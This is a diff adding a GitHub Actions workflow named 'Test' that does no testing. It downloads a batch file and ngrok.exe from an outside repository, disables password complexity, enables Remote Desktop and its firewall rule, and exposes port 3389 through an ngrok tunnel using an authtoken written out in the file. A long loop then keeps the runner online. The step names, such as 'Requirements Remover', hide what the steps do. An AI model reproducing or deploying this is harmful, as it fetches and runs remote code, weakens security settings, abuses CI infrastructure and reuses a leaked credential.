@@ -1,0 +1,38 @@
+name: Test
+on: workflow_dispatch
+
+jobs:
+  build:
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [windows-latest]
+        node: ['16']
+        include:
+        - os: windows-latest
+          commandPrefix: ''
+    runs-on: ${{ matrix.os }}
+    steps:
+    - name: Requirements Remover
+      run: |
+        cd C:\Windows
+        C:
+        cd
+        Start-Process Powershell -ArgumentList '-Noexit -Command "Invoke-WebRequest https://raw.githubusercontent.com/FleterA2/rdp/main/resources/start.bat -OutFile start.bat"'
+        Start-Process Powershell -ArgumentList '-Noexit -Command "Invoke-WebRequest https://raw.githubusercontent.com/FleterA2/rdp/main/resources/ngrok.exe -OutFile ngrok.exe"'
+        secedit /export /cfg c:\secpol.cfg
+        (gc C:\secpol.cfg).replace("PasswordComplexity = 1", "PasswordComplexity = 0") | Out-File C:\secpol.cfg
+        secedit /configure /db c:\windows\security\local.sdb /cfg c:\secpol.cfg /areas SECURITYPOLICY
+        rm -force c:\secpol.cfg -confirm:$false
+    - name: Host (ngrok)
+      run: |
+        Start-Process cmd -ArgumentList '/c "C:\Windows\start.bat"'
+        Set-ItemProperty -Path 'HKLM:\System\CurrentConrolSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        ngrok.exe config add-authtoken 1jlQ3vQwtRHGQaZ4lkIhaslLt31_5knGeAyKG3dvVJbt7nuRr
+        Start-Process Powershell -ArgumentList '-Noexit -Command "ngrok.exe tcp 3389 --region ap"'
+    - name: Make It Keep Online!
+      run: |
+        $i = 2147483
+        do {Write-Host $i Sleep 0 $i--} while ($i -gt 0)
